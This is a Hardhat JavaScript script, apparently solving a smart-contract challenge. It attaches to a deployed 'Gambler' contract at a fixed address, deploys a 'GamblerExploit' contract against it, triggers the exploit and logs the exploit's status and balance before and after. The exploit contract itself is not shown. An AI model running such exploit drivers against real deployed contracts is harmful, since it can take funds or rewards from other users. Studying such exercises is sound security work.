const { ethers } = require("hardhat");

async function getContract() {
  //const LibGamblerFactory = await ethers.getContractFactory("libGambler");
  //const libGambler = await LibGamblerFactory.deploy();
  //const SafeMathFactory = await ethers.getContractFactory("SafeMath");
  //const SafeMath = await SafeMathFactory.deploy();
  const GamblerFactory = await ethers.getContractFactory("Gambler", {
    libraries: {
      SafeMath: "0x8a5ba2bca9801beac0a679f1d7e72a339b2ca8c2",
      libGambler: "0x8674141e5af6b97d0be342c1dd157d0b8bb7ef57",
    },
  });
  const gamblerInstance = GamblerFactory.attach(
    "0x23cb5a2d4d08ebf6b9c893d76ef2fbfe3588efaf"
  );
  return gamblerInstance;
}

async function main() {
  const gamblerInstance = await getContract();

  const ExploitFactory = await ethers.getContractFactory("GamblerExploit");
  const exploitInstance = await ExploitFactory.deploy(gamblerInstance.address);

  console.log(
    "Before the game. Is our exploit a 'Gambler'?",
    await gamblerInstance.Gambler(exploitInstance.address)
  );
  console.log(
    "Exploit contract balance:",
    await gamblerInstance.balanceOf(exploitInstance.address)
  );
  await exploitInstance.start(ethers.constants.AddressZero);

  console.log(
    "After the game. Is our exploit a 'Gambler'?",
    await gamblerInstance.Gambler(exploitInstance.address)
  );
  console.log(
    "Exploit contract balance:",
    await gamblerInstance.balanceOf(exploitInstance.address)
  );
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
